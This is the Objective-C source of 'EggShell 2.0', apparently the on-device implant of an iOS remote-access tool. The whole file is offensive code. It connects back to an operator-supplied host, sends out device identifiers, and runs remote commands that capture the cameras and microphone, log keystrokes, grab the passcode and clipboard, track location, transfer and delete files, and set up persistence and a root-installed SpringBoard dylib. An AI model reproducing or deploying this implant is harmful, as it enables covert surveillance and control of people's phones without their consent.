//EggShell 2.0
//Created By lucas.py 8-18-16
//Last update 9-17-16
//Copyright 2016 Lucas Jackson

#include "espl.h"

NSFileManager *filemanager = [NSFileManager alloc];;
espl *_espl;

NSString *tmpData = @"";
NSArray *noReplyCommands = [[NSArray alloc] initWithObjects:
@"play", @"pause", @"next", @"prev", @"home", @"doublehome", @"lock", @"wake",@"keylogclear",@"togglemute",@"lockout",nil];
NSArray *yesReplyCommands = [[NSArray alloc] initWithObjects:
@"ismuted",@"getpasscode",@"getpaste",@"unlock",@"keylog",@"lastapp",@"islocked",nil];


int main(int argc, char **argv, char **envp) {
    _espl = [[espl alloc] init];
    /*this actually fucks up the alert command idk why
     [filemanager removeItemAtPath:[NSString stringWithFormat:@"%s",argv[0]] error:nil]; //delete self and cry
    */
    
    [filemanager changeCurrentDirectoryPath:NSHomeDirectory()];

    if (argc == 1) { return 0; }
    //decrypt argument with shared key
    NSString *argument = [NSString stringWithFormat:@"%s",argv[1]];
    argument = [escryptor decryptB64ToNSString:@"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV" :argument];
    if (argument == NULL) {
        HBLogDebug(@"its nil on the why");
    }
    //obtain real args from decrypted argument
    NSArray *args = [argument componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
    //connect to host:port args
    int success = [_espl connect:[NSString stringWithFormat:@"%@",args[0]] :atoi([args[1] UTF8String])];
    //set escryptor key from args
    _espl.skey = args[2];
    //set terminator from args
    _espl.terminator = [args[3] substringToIndex:16];
    //check if connection was accepted
    if (success == -1) {
        HBLogDebug(@"couldnt establish connection %s %s %s",argv[1],argv[2],argv[3]);
    }
    else {
        NSString *name = [NSString stringWithFormat:@"%@ %@@%@",[[_espl thisUIDevice] identifierForVendor],NSUserName(),[[_espl thisUIDevice] name]];
        [_espl sendString:name];
        NSString *command;
        char buffer[2048];
        while (read(sockfd, &buffer, sizeof(buffer))) {
            //decrypt received data
            command = [escryptor decryptB64ToNSString:_espl.skey :
                       [NSString stringWithFormat:@"%s",buffer]];
            //json decode
            NSDictionary *receivedDictionary = [NSJSONSerialization JSONObjectWithData: [command dataUsingEncoding:NSUTF8StringEncoding]
                                                                               options: NSJSONReadingAllowFragments
                                                                                 error: nil];
            //assign
            NSString *cmd = [receivedDictionary objectForKey:@"cmd"];
            NSString *cmdArgument = [receivedDictionary objectForKey:@"args"];
            
            _espl.terminator = [receivedDictionary objectForKey:@"term"];
        
            if ([cmd isEqualToString: @"exit"]) {
                exit(1);
            }
            else if ([cmd isEqualToString: @"getpid"]) {
                [_espl getPid];
            }
            else if ([cmd isEqualToString: @"vibrate"]) {
                [_espl vibrate];
            }
            else if ([cmd isEqualToString: @"alert"]) {
                [_espl alert:[cmdArgument componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]]];
            }
            else if ([cmd isEqualToString: @"reboot"]) {
                [_espl exec:@"reboot"];
            }
            else if ([cmd isEqualToString: @"ls"]) {
                [_espl directoryList:cmdArgument];
            }
            else if ([cmd isEqualToString: @"cd"]) {
                [_espl changeWD:cmdArgument];
            }
            else if ([cmd isEqualToString: @"rm"]) {
                [_espl rmFile:cmdArgument];
            }
            else if ([cmd isEqualToString: @"pwd"]) {
                [_espl sendString:filemanager.currentDirectoryPath];
            }
            else if ([cmd isEqualToString: @"download"]) {
                [_espl download:cmdArgument];
            }
            else if ([cmd isEqualToString: @"setvol"]) {
                [_espl setVolume:cmdArgument];
            }
            else if ([cmd isEqualToString: @"getvol"]) {
                [_espl getVolume];
            }
            else if ([cmd isEqualToString: @"isplaying"]) {
                [_espl isplaying];
            }
            else if ([cmd isEqualToString: @"openurl"]) {
                [_espl openURL:cmdArgument];
            }
            else if ([cmd isEqualToString: @"dial"]) {
                [_espl dial:cmdArgument];
            }
            else if ([cmd isEqualToString: @"frontcam"]) {
                [_espl camera:true];
            }
            else if ([cmd isEqualToString: @"backcam"]) {
                [_espl camera:false];
            }
            else if ([cmd isEqualToString: @"mic"]) {
                [_espl mic:cmdArgument];
            }
            else if ([cmd isEqualToString: @"locate"]) {
                [_espl locate];
            }
            else if ([cmd isEqualToString: @"respring"]) {
                [_espl exec:@"killall SpringBoard"];
                [_espl blank];
            }
            else if ([cmd isEqualToString: @"battery"]) {
                [_espl sendString:[_espl battery]];
            }
            else if ([cmd isEqualToString: @"listapps"]) {
                [_espl listapps];
            }
            else if ([cmd isEqualToString: @"open"]) {
                [_espl launchApp:cmdArgument];
            }
            else if ([cmd isEqualToString: @"sysinfo"]) {
                [_espl sysinfo];
            }
            else if ([cmd isEqualToString: @"say"]) {
                [_espl say:[command stringByReplacingOccurrencesOfString: @"say " withString:@""]]; //TODO: fix this idiot
            }
            else if ([cmd isEqualToString: @"persistence"]) {
                [_espl persistence:[NSString stringWithFormat:@"%@",args[0]]:atoi([args[1] UTF8String])];
            }
            else if ([cmd isEqualToString: @"rmpersistence"]) {
                [_espl rmpersistence];
            }
            else if ([cmd isEqualToString: @"installpro"]) {
                if (getuid() == 0) {
                    [_espl sendString:@"1"];
                    [_espl upload:@"/Library/MobileSubstrate/DynamicLibraries/eggshellPro.dylib"];
                    [_espl exec:@"echo '{ Filter = { Bundles = ( \"com.apple.springboard\" ); }; }' > /Library/MobileSubstrate/DynamicLibraries/eggshellPro.plist;killall SpringBoard"];
                    [_espl blank];
                }
                else {
                    [_espl sendString:@"Requires Root"];
                }
            }
            //PRO Commands
            else if ([cmd isEqualToString: @"locationservice"]) {
                [_espl locationService:cmdArgument];
            }
            else if ([noReplyCommands containsObject:cmd]) {
                [_espl mcSendNoReply:cmd];
            }
            else if ([yesReplyCommands containsObject:cmd]) {
                [_espl mcSendYesReply:cmd];
            }
            else {
                [_espl sendString:@"-1"];
            }
            //clear the received data
            memset(buffer,'\0',2048);
        }
    }
	return 0;
}
